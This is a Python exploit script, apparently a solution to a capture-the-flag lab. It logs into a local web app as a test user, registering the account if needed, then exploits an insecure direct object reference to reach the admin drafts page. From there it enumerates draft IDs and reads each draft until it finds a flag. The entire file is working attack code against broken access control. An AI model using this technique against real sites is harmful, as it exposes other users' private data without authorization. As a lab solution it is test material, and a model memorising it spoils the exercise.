import requests
import re

# Base URL
BASE_URL = "http://127.0.0.1:5003"

# Create session to maintain cookies
session = requests.Session()

print("[*] Step 1: Attempting to login with testuser:test123")

try:
    # Try to login first
    login_data = {
        "username": "testuser",
        "password": "test123"
    }

    login_response = session.post(f"{BASE_URL}/login", data=login_data, allow_redirects=False, timeout=10)
    print(f"[+] Login attempt - Status: {login_response.status_code}")

    # Check if we need to register
    if "does not exist" in login_response.text or login_response.status_code == 401:
        print("[*] Step 2: Registering account")
        register_response = session.post(f"{BASE_URL}/register", data=login_data, allow_redirects=False, timeout=10)
        print(f"[+] Registration - Status: {register_response.status_code}")
        
        # Login again
        print("[*] Step 3: Logging in after registration")
        login_response = session.post(f"{BASE_URL}/login", data=login_data, allow_redirects=False, timeout=10)
        print(f"[+] Login - Status: {login_response.status_code}")

    print(f"[+] Session cookies: {dict(session.cookies)}")

    print("\n[*] Step 4: Exploiting IDOR - Accessing /admin/drafts")
    
    # Access admin drafts endpoint (IDOR vulnerability)
    admin_drafts_response = session.get(f"{BASE_URL}/admin/drafts", timeout=10)
    print(f"[+] Admin drafts - Status: {admin_drafts_response.status_code} | Length: {len(admin_drafts_response.content)}B")

    if admin_drafts_response.status_code == 200:
        print("[+] Successfully accessed admin drafts!")
        
        # Extract draft IDs from HTML
        draft_ids = re.findall(r'/edit_draft/(\d+)', admin_drafts_response.text)
        
        if not draft_ids:
            # Try numeric patterns
            draft_ids = [str(i) for i in range(1, 20)]
        else:
            draft_ids = list(set(draft_ids))
        
        print(f"[*] Step 5: Found draft IDs: {draft_ids}")
        
        # Access each draft
        print("\n[*] Step 6: Accessing drafts to find FLAG")
        
        for draft_id in draft_ids:
            draft_response = session.get(f"{BASE_URL}/edit_draft/{draft_id}", timeout=10)
            
            if draft_response.status_code == 200:
                # Search for FLAG
                flag_match = re.search(r'FLAG\{[^}]+\}', draft_response.text)
                if flag_match:
                    flag = flag_match.group(0)
                    print(f"\n[!] FLAG FOUND in draft {draft_id}!")
                    print(f"[!] FLAG: {flag}")
                    print(f"\n[+] Draft content:\n{draft_response.text}")
                    break
                else:
                    print(f"[+] Draft {draft_id} - Status: {draft_response.status_code} (no FLAG)")
            else:
                print(f"[-] Draft {draft_id} - Status: {draft_response.status_code}")
    else:
        print(f"[-] Failed to access admin drafts - Status: {admin_drafts_response.status_code}")
        print(f"[+] Response: {admin_drafts_response.text}")

except Exception as e:
    print(f"[-] Error: {e}")
    import traceback
    traceback.print_exc()

